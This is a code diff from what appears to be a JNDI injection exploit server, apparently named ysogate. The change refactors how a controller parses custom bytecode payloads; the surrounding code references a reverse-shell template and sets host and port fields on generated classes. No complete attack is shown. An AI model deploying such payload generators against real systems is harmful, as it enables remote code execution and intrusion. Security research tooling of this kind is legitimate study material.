@@ -10,16 +10,11 @@ import com.h2tg.ysogate.exploit.server.WebServer;
 import com.h2tg.ysogate.template.ReverseShellTemplate;
 import com.h2tg.ysogate.utils.MiscUtils;
 import com.h2tg.ysogate.utils.CtClassUtils;
-
 import java.io.ByteArrayInputStream;
 import java.io.DataInputStream;
 import java.io.IOException;
-import java.nio.file.Files;
-import java.nio.file.Paths;
-import java.util.Arrays;
-import java.util.Base64;
 
-import static com.h2tg.ysogate.utils.MiscUtils.tryBase64UrlDecode;
+import static com.h2tg.ysogate.utils.MiscUtils.parseCustomData;
 
 @JNDIController
 @JNDIMapping("/Basic")
@@ -91,9 +86,9 @@ public class BasicController implements Controller {
         System.out.println("[Code] Load custom bytecode data");
         byte[] byteCode;
         try {
-            byteCode = parseData(data);
+            byteCode = parseCustomData(data);
         } catch (Exception e) {
-            System.out.println("[Error] Failed to parse data");
+            System.out.println("[Error] Failed to parse custom data");
             return null;
         }
 
@@ -114,22 +109,5 @@ public class BasicController implements Controller {
         CtClassUtils.setCtField(clazz, "port", CtField.Initializer.constant(Integer.parseInt(port)));
 
         return clazz.toBytecode();
-    }
-
-    private byte[] parseData(String data) throws IOException {
-        String prefix = data.substring(0, data.indexOf(":"));
-        String baseStr = data.substring(data.indexOf(":") + 1);
-        if (prefix.equals("data")) {
-            return Base64.getUrlDecoder().decode(baseStr);
-        } else if (prefix.equals("file")) {
-            String path = tryBase64UrlDecode(baseStr);
-            return Files.readAllBytes(Paths.get(path));
-        } else if (prefix.equals("mem")) {
-            return null;
-        }
-        else {
-            System.out.println("[Error] Unknown prefix: " + prefix);
-            return null;
-        }
     }
 }
